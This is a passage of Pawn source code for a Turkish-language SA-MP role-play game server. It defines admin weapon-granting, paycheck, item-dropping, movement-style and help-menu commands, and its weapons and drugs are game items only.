    if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

        new sstring[128], playa, gun;

        if(sscanf(params, "ud", playa, gun)) {
            SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /givegun [Oyuncu ID/Ýsim] [weaponid]");
            SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
            SendClientMessage(playerid, COLOR_GRAD4, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana 9: Chainsaw");
            SendClientMessage(playerid, COLOR_GRAD4, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers(Buglu) 15: Cane 16: Frag Grenade");
            SendClientMessage(playerid, COLOR_GRAD3, "17: Tear Gas 18: Molotov Cocktail 19: Vehicle Missile 20: Hydra Flare 21: Jetpack 22: 9mm 23: Silenced 9mm 24: Desert Eagle");
            SendClientMessage(playerid, COLOR_GRAD4, "26: Sawnoff Shotgun 27: Combat Shotgun 28: Micro SMG (Mac 10) 29: SMG (MP5) 30: AK-47 31: M4 32: Tec9 33: Rifle");
            SendClientMessage(playerid, COLOR_GRAD4, "25: Shotgun 34: Sniper Rifle 35: Rocket Launcher 36: HS Rocket Launcher 37: Flamethrower 38: Minigun 39: Satchel Charge");
            SendClientMessage(playerid, COLOR_GRAD4, "40: Detonator 41: Spraycan 42: Fire Extinguisher 43: Camera 44: Nightvision Goggles 45: Infared Goggles 46: Parachute");
            SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
            return 1;
        }

        if(gun < 1||gun > 47)
            { SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz silah ID'si!"); return 1; }
        if(IsPlayerConnected(playa)) {
            if(PlayerInfo[playa][pConnectTime] < 2 && gun != 46 && gun != 43) return SendClientMessage(playerid, COLOR_GRAD2, "Bu kiþinin silah taþýmasý þu anlýk yasaklandý");
            if(playa != INVALID_PLAYER_ID && gun <= 20 || gun >= 22) {

                GivePlayerValidAdminWeapon(playa, gun, 60000);

                new weaponname[32];
                GetWeaponName(gun, weaponname, sizeof(weaponname));

                format(sstring, sizeof(sstring), "%s adlý kiþiye silah verdin, ID %d (%s)!",GetPlayerNameEx(playa), gun, weaponname);
                SendClientMessage(playerid, COLOR_GRAD1, sstring);
            }
            else if(playa != INVALID_PLAYER_ID && gun == 21) {
                JetPack[playa] = 1;
                SetPlayerSpecialAction(playa, SPECIAL_ACTION_USEJETPACK);
                SendClientMessage(playerid, COLOR_GRAD1, sstring);
            }
        }
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:maas(playerid, params[])
{
	if(PayCheckCode[playerid] == 0) return SendClientMessage(playerid, COLOR_WHITE, "Imzalayacak maaþ yok. Bir sonraki maaþ için bekleyin.");

 	new string[128];
	format(string, sizeof(string), "Maas Kodu: %d\n\nMaaþýný almak için çek kodunu gir:", PayCheckCode[playerid]);
	ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Çek imzalama", string, "Çeki imzala","Iptal");
    return 1;
}

CMD:yoket(playerid, params[]) {
	new string[128], choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yoket [name]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isýmler: Silahlar, Pot, Crack, Materyaller, Paketler, Kutular, Radyo, Pizza, Lisanslar, Evanahtari");
		return 1;
	}

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Kelepçeliyken/þokluyken bu komutu kullanamazsýn.");

	if(strcmp(choice,"materyaller",true) == 0)
	{
		if(PlayerInfo[playerid][pMats] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), " %d materyalini attýn.", PlayerInfo[playerid][pMats]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s materyallerini attý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pMats] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Atacak herhangi bir materyalin yok!");
		}
	}
	else if(strcmp(choice,"evanahtari",true) == 0)
	{
		if(HouseKey[playerid] != INVALID_HOUSE_ID)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), " %s kiþisinin ev anahtarýný býraktýn.", HouseInfo[HouseKey[playerid]][hOwner]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s bir ev anahtarý býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			HouseKey[playerid] = INVALID_HOUSE_ID;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Kimsenin ev anahtarýna sahip deðilsin.");
		}
	}
	else if(strcmp(choice,"radyo",true) == 0)
	{
		if(PlayerInfo[playerid][pRadio] != 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s portatif radyosunu attý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pRadio] = 0;
			PlayerInfo[playerid][pRadioFreq] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Atacak bir portatif radyon yok!");
		}
	}
	else if(strcmp(choice,"lisanslar",true) == 0)
	{
		PlayerInfo[playerid][pCarLic] = 0;
		PlayerInfo[playerid][pBoatLic] = 0;
		PlayerInfo[playerid][pFlyLic] = 0;

		SendClientMessage(playerid, COLOR_WHITE, "Tüm lisanslarýný býraktýn.");
	}
	else if(strcmp(choice,"silahlar",true) == 0)
	{
		if(GetPVarInt(playerid, "PBM") > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Paintball maçýndayken bunu yapamazsýn.");
			return 1;
		}
		if(GetPVarInt(playerid, "EventToken") != 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu yapamazsýn.");
			return 1;
		}
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		ResetPlayerWeaponsEx(playerid);
		format(string, sizeof(string), "* %s silahlarýný attý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(PlayerInfo[playerid][pPot] > 0)
		{
			format(string, sizeof(string), " %d gram pot'u býraktýn.", PlayerInfo[playerid][pPot]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s potlarýný býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pPot] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Atacak pot'un yok!");
		}
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(PlayerInfo[playerid][pCrack] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "%d gram crack býraktýn.", PlayerInfo[playerid][pCrack]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s cracklerini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pCrack] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Atacak crack'in yok!");
		}
	}
	else if(strcmp(choice,"paketler",true) == 0) {
		if(GetPVarType(playerid, "Packages") > 0) {
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s materyal paketlerini býraktý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DisablePlayerCheckpoint(playerid);
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;

			GivePlayerCash(playerid, 50); // refund their packages
			DeletePVar(playerid, "tpMatRunTimer");
			DeletePVar(playerid, "Packages");
			DeletePVar(playerid, "MatDelivery");
		}
		else SendClientMessage(playerid, COLOR_GREY, "Atacak materyal paketin yok!");
	}
	else if(strcmp(choice,"kutular",true) == 0)
	{
		if(PlayerInfo[playerid][pCrates] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s uyuþturucu kutusunu attý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pCrates] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Atacak uyuþturucu kutun yok!");
		}
	}
	else if(strcmp(choice,"pizza",true) == 0)
	{
		if(GetPVarInt(playerid, "Pizza") > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s pizza sipariþini attý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPVarInt(playerid, "Pizza", 0);
            DestroyProgressBar(PizzaBar[playerid]);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Pizza teslim etmiyorsun!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yoket [name]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Weapons, Pot, Crack, Materials, Packages, Crates, Radio, Pizza, Licenses, Housekey");
	}
	return 1;
}

CMD:dovusstili(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid, fightstyle;
		if(sscanf(params, "ud", giveplayerid, fightstyle))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /dovusstili [Oyuncu ID/Ýsim] [fightstyle]");
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Dövüþ Stilleri: 4, 5, 6, 7, 15, 26.");
			return 1;
		}

		if(fightstyle > 3 && fightstyle < 8 || fightstyle == 15 || fightstyle == 26)
		{
			format(string, sizeof(string), " Dövüþ stilin, stil %d olarak deðiþti.", fightstyle);
			SendClientMessage(giveplayerid,COLOR_YELLOW,string);
			format(string, sizeof(string), " %s kiþisinin dövüþ stilini, stil %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid), fightstyle);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			SetPlayerFightingStyle(giveplayerid, fightstyle);
			PlayerInfo[playerid][pFightStyle] = fightstyle;
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:hospital(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(GetPVarInt(playerid, "Hospital") > 0)
		{
			DeletePVar(playerid, "HospitalTimer");
			HospitalSpawn(playerid);
			DeletePVar(playerid, "Hospital");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Hastanede deðilsin!");
		}
	}
	return 1;
}

CMD:maasyardim(playerid, params[])
{
	ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Maaþ bilgisi","Maaþlar saatte bir gelir ve /maas komutuyla alýnýr.\n\nOyunda ne kadar çok kalýrsan, maaþýn o kadar çok olur.\n\nLevelin yükseldikçe maaþýn artar.\n\nMaaþlar nakit olarak cebine deðil, direkt banka hesabýna gider.\n\nEðer bir maaþý kaçýrýrsan, kaçýrdýðýn miktar bir sonraki maaþýna eklenir.","Kapat","");
	return 1;
}


CMD:vergiyardim(playerid, params[])
{
	ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Gelir vergisi bilgisi","Maaþlar düz vergiden çok aþamalý gelir vergisine sahiptir.\n\nBasit olarak maaþýn ne kadar çoksa, o kadar çok gelir vergisi ödediðin anlamýna gelir.\n\nOranlar þöyledir:\n\n $1250 den azsa- 10% vergi\n$1250 ile $1999 arasýnda - 15% vergi\n$2000 ile $2499 arasýnda - 25% vergi\n$2500 ile $3499 arasýnda - 30% vergi\n $3500 den çoksa - 35% vergi","Kapat","");
	return 1;
}

CMD:refyardim(playerid, params[])
{
	ShowPlayerDialogEx(playerid,12768,DIALOG_STYLE_MSGBOX,"Referans sistemi bilgisi", "Referans sistemi oyuncularýn oyuna baþlarken referans aldýðý kiþiyi belirterek bu durumdan dolayý ödül kazanmalarýný saðlar.\n\nKayýt ekranýnda, yeni baþlayan oyuncu eðer oyuna birisi vasýtasýyla geliryorsa onun adýný referans verir.\n\nYeni oyuncu 8 saat boyunca oyunu oynarsa, yeni oyuncuyu davet eden kiþi 1 referans jetonu kazanýr.","Ileri","");
	return 1;
}



CMD:hedefisifirla(playerid, params[]) {
	return cmd_hedefsifirla(playerid, params);
}

CMD:hedefsifirla(playerid, params[]) {
	TaxiAccepted[playerid] = 999;
	BusAccepted[playerid] = 999;
	MedicAccepted[playerid] = 999;
	MechanicCallTime[playerid] = 0;
    DeletePVar(playerid, "TrackCar");
    DeletePVar(playerid, "CrateDeliver");
    DeletePVar(playerid, "Packages");
    EMSAccepted[playerid] = INVALID_PLAYER_ID;
    DisablePlayerCheckpoint(playerid);
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 	TaxiCallTime[playerid] = 0;
  	BusCallTime[playerid] = 0;
  	EMSCallTime[playerid] = 0;
  	DeletePVar(playerid, "Pizza");
  	CP[playerid] = 0;
  	FindingJob[playerid] = 0;
  	FindingDealership[playerid] = 0;
    SendClientMessage(playerid,COLOR_WHITE,"Tüm mevcut checkpointler, izciler ve kabul edilmiþ ücretler resetlendi.");
	return 1;
}

CMD:saticibul(playerid, params[]) {
	if(CheckPointCheck(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");

	new
		szDealershipName[128],
		szMessage[1024];
    for(new d = 0; d < sizeof(CarDealershipInfo); d++) {
		if(CarDealershipInfo[d][cdEntranceX] != 0.0 && CarDealershipInfo[d][cdEntranceY] != 0.0) {
			if(CarDealershipInfo[d][cdOwned]) {
				format(szDealershipName, sizeof(szDealershipName), "%s\n", CarDealershipInfo[d][cdMessage]);
				strcat(szMessage, szDealershipName, sizeof(szMessage));
			}
		}
	}
	if(strlen(szMessage) == 0)
	{
		strcat(szMessage, "Bayilik bulunamadý.", sizeof(szMessage));
	}
	ShowPlayerDialogEx(playerid, FINDDEALERSHIPMENU, DIALOG_STYLE_LIST, "Phoenix Role Play - Bayilikler", szMessage, "Seç", "Iptal");
	return 1;
}

CMD:modifiyecibul(playerid, params[])
{
	if(CheckPointCheck(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");

	ShowPlayerDialogEx(playerid, FINDCARTUNINGMENU, DIALOG_STYLE_LIST, "Araç modifiye garajý seçin", "TransFender - San Fierro\nWheel Arch Angels - San Fierro\nLowRider Tuning Garage - Los Santos\nTransFender - Los Santos\nTransFender - Las Venturas", "Seç", "Iptal");
    return 1;
}

CMD:hoparlor(playerid, params[]) return cmd_telefonhoparlor(playerid, params);
CMD:telefonhoparlor(playerid,params[])
{
	if(PlayerInfo[playerid][pNumber] == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Telefonun yok.");

	if(SpeakerPhone[playerid] == 1) {
		SpeakerPhone[playerid] = 0;
		SendClientMessage(playerid, COLOR_WHITE, "Telefonunun hoparlörünü kapattýn.");
	} else {
		SpeakerPhone[playerid] = 1;
		SendClientMessage(playerid, COLOR_WHITE, "Telefonunun hoparlörünü açtýn.");
	}
	return true;
}

CMD:uyeler(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] > 0) {
		new
			szMessage[128],
			szRank[64],
			szEmployer[64],
			szDivision[64];
		SendClientMessage(playerid, COLOR_CYAN, "Online Kullanýcýlar:");
		foreach(Player, i) {
			if(PlayerInfo[playerid][pFaction] == PlayerInfo[i][pFaction] && AdminDuty[i] != 1) {
				GetPlayerFactionInfo(i, szRank, szDivision, szEmployer);
				if(PlayerInfo[i][pDivision] != 0) {
					format(szMessage, sizeof(szMessage), "* %s %s %s (%i)", szDivision, szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				} else {
					format(szMessage, sizeof(szMessage), "* %s %s (%i)", szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
			}
		}
	} else if(PlayerInfo[playerid][pGang] != 255) {
		new
	        szMessage[128],
			szRank[64];

		SendClientMessage(playerid, COLOR_CYAN, "Online Kullanýcýlar:");
		foreach(Player, i) {
			if(PlayerInfo[playerid][pGang] == PlayerInfo[i][pGang] && AdminDuty[i] != 1) {
				switch(PlayerInfo[i][pRank])
				{
					case 1: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank1]);
					case 2: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank2]);
					case 3: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank3]);
					case 4: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank4]);
					case 5: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank5]);
					case 6: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank6]);
					default: format(szRank, sizeof(szRank), "%s", FamilyInfo[PlayerInfo[i][pGang]][FamilyRank1]);
				}
				format(szMessage, sizeof(szMessage), "* %s %s (%i)", szRank, GetPlayerNameEx(i), PlayerInfo[i][pRank]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
		}
	} else SendClientMessage(playerid, COLOR_GRAD2, "Bir kuruluþ/aile üyesi deðilsin.");
	return true;
}

CMD:pointbilgisi(playerid, params[])
{
	new
		iCount,
		szMessage[128];

	SendClientMessage(playerid, COLOR_CYAN, "Point Bilgisi:");
	for(new i; i < MAX_POINTS; i++) {
		if(Points[i][Type] >= 0) {
		    if(Points[i][Vulnerable] == 0 && Points[i][TakeOverTimerStarted] > 0)  {
				if(Points[i][TakeOverTimer] == 0) {
					format(szMessage, sizeof(szMessage), "* %s | Capper: %s | Aile: %s | Kalan Zaman: 1 Dakikadan az", Points[i][Name], Points[i][PlayerNameCapping], FamilyInfo[Points[i][ClaimerTeam]][FamilyName]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					iCount++;
				} else {
					format(szMessage, sizeof(szMessage), "* %s | Capper: %s | Aile: %s | Kalan Zaman: %d dakika", Points[i][Name], Points[i][PlayerNameCapping], FamilyInfo[Points[i][ClaimerTeam]][FamilyName], Points[i][TakeOverTimer]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					iCount++;
				}
			}
		}
	}
	if(iCount == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "No family has capped the point or the point is not ready to be capped.");
	return 1;
}

CMD:yuruyus(playerid, params[])
{
	new
		iSuccess;
	switch(strval(params))
	{
		case 1: { SetPlayerWalkingStyle(playerid, 0); iSuccess++; }
		case 2: { SetPlayerWalkingStyle(playerid, 3); iSuccess++; }
		case 3: { SetPlayerWalkingStyle(playerid, 4); iSuccess++; }
		case 4: { SetPlayerWalkingStyle(playerid, 5); iSuccess++; }
		case 5: { SetPlayerWalkingStyle(playerid, 6); iSuccess++; }
		case 6: { SetPlayerWalkingStyle(playerid, 8); iSuccess++; }
		case 7: { SetPlayerWalkingStyle(playerid, 9); iSuccess++; }
		case 8: { SetPlayerWalkingStyle(playerid, 10); iSuccess++; }
		case 9: { SetPlayerWalkingStyle(playerid, 11); iSuccess++; }
		case 10: { SetPlayerWalkingStyle(playerid, 12); iSuccess++; }
		case 11: { SetPlayerWalkingStyle(playerid, 13); iSuccess++; }
		default: SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yuruyus [1-11]");
	}
	if(iSuccess > 0) SendClientMessage(playerid, COLOR_WHITE, "Yeni bir yürüyüþ stili kullanýyorsun.");
	return 1;
}

CMD:yardim(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] <= 3)
	{
		SendClientMessage(playerid, COLOR_CYAN,"*** YARDIM *** /rapor (/n)ewbie /newbiekapat");
	}
	SendClientMessage(playerid, COLOR_WHITE,"*** HESAP *** /kurallar /(net)stats /esyalarim /silahlarim /levelatla /gelisim /sifredegistir /hedefsifirla /gelisimsifirla(10k)");
	SendClientMessage(playerid, COLOR_WHITE,"*** SOHBET *** /w(hisper) /o(oc) /s(hout) /l(ow) /b /reklamlar /f(amily) /me /toggc /togfam /fisiltikapat /eviturla");
	SendClientMessage(playerid, COLOR_WHITE,"*** BANKA *** /hesap /paracek /parayatir /transfer /ahesap /acek /aparayatir /atransfer");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENEL *** /ode /bagis /zaman /satinal /id /muzik /lisansgoster /kiyafetler /kiyafetal /yeniliklerkapat /saticibul");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENEL *** /yetenekler /animdurdur /yap /me /geber /yoketlicense /hesapla /arac /aileler /yardimiste /uyeler /yuruyus");
	SendClientMessage(playerid, COLOR_WHITE,"*** GENEL *** /iptal /kabulet /aractanat /potkullan /crackkullan /kontrakt /cagir /tohumkontrol /modifiyecibul /bilgilendirme");


	switch(PlayerInfo[playerid][pJob])
	{
		case 1: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /takipet");
		case 2: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM*** /avukatisbasi /serbestbirak /koru /arananlar");
		case 3: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM*** /sex");
		case 4: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /potsat /cracksat /crackal /tohumal /tohumdik /tohumtopla /tohumkontrol");
		case 5: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /yoketcar");
		case 7: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /tamir /nos /hidrolik /tamtamir /tisbasi");
		case 8: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /zirhsat /ustunuara");
		case 9: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /getmats /materyalsat /silahsat");
		//case 10: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellnewcar");
		case 12: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /dovus /boxistatistik");
		case 14: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /kasaal");
		//case 15: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /papers /bring /teslimet");
		case 18: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /getmats /materyalsat /zanaat");
		case 19: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /iceceksat");
		case 20: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /yukyukle /yukkontrol /yukcal");
		case 21: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /pizzaal");
	}
	switch(PlayerInfo[playerid][pJob2])
	{
		case 1: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /takipet");
		case 2: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /avukatisbasi /serbestbirak /koru /arananlar");
		case 3: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /sex");
		case 4: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /potsat /cracksat /crackal /tohumal /tohumdik /tohumtopla /tohumkontrol");
		case 5: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /yoketcar");
		case 7: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /tamir /nos /hidrolik /tamtamir /tisbasi");
		case 8: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /zirhsat /ustunuara");
		case 9: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /paketal /materyalsat /silahsat");
		//case 10: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /sellnewcar");
		case 12: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /dovus");
		case 14: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /kasaal");
		//case 15: SendClientMessage(playerid,COLOR_WHITE,"*** JOB *** /papers /bring /teslimet");
		case 18: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /paketal /materyalsat /zanaat");
		case 19: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /iceceksat");
		case 20: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /yukyukle /yukkontrol /yukcal");
		case 21: SendClientMessage(playerid,COLOR_WHITE,"*** IS YARDIM *** /pizzaal");
	}

	switch(PlayerInfo[playerid][pFaction]) {
		case 1: {
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** (/r)adio /hm (/d)epartments (/m)egafon (/su)cekle /lspd /mvb /aracaat /hapseat /arananlar /kelepce /tazer /elkoydenizcibelgesi");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /ustunuara /ustundenal /cezakes (/gov)ernment /kapiyikir /davetet /rutbever /civikoy /civiyoket /civiler /rozet /merkezidagitim");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /barikatkur /barikatkaldir /elkoysurucubelgesi /aracbilgisi /amvb /acezakes /aracicek /aracicekmeyibirak /aracibagla");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /araciara /yukkontrol /yuktemizle /radarsilahi /destek /destekiptal /tohumlariyoket /barikatlarikaldir /radar /parmakizi");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSPD *** /sirenyoket /dmvbirak /lspdbirim /siren /surukle /elkoypilotbelgesi");
		}
		case 2: {
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** (/r)adio (/d)epartments (/m)egafon (/su)cekle /fbi /mvb /aracaat /hapseat /arananlar /kelepce /tazer /surukle /elkoypilotbelgesi");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /ustunuara /ustundenal /cezakes (/gov)ernment /kapiyikir /davetet /rutbever /civikoy /civiyoket /civiler /rozet /merkezidagitim");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /barikatkur /barikatkaldir /elkoysurucubelgesi /aracbilgisi /amvb /acezakes /aracicek /aracicekmeyibirak /aracibagla");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /araciara /yukkontrol /yuktemizle /radarsilahi /destek /destekiptal /tohumlariyoket /warrantarrest /barikatlarikaldir");
			SendClientMessage(playerid, COLOR_WHITE, "*** FBI *** /sirenyoket /dmvbirak /fbibirim  /elkoydenizcibelgesi /radar /parmakizi /siren");
		}
		case 3: {
			SendClientMessage(playerid, COLOR_WHITE, "*** LSFMD *** (/r)adio (/d)epartments (/m)egafon /iyilestir /davetet /rutbever /lsfmd /lsfmdbirim /yaralilistesi /merkezidagitim");
			SendClientMessage(playerid, COLOR_WHITE, "*** LSFMD *** /ykabul /ytasi /yaracaat /yteslimet /tohumlariyoket /fmdc /rozet /olusumaraclarispawnla");
		}
		case 4: {
			SendClientMessage(playerid, COLOR_WHITE, "*** HITMAN AJANSI *** (/f) /kontraktlar /goreval /siparis /rutbeler /profil /hrozet /hmesaj");
			SendClientMessage(playerid, COLOR_WHITE, "*** HITMAN AJANSI *** /bk /aracabombakoy /bombayial /davetet /rutbever /mekanigoster");
		}
		case 5: {
			SendClientMessage(playerid, COLOR_WHITE, "*** GOVERNMENT *** (/r)adio (/d)epartments /sad /sadbirim /gov /surukle /merkezidagitim");
			if(PlayerInfo[playerid][pDivision] == 5) {
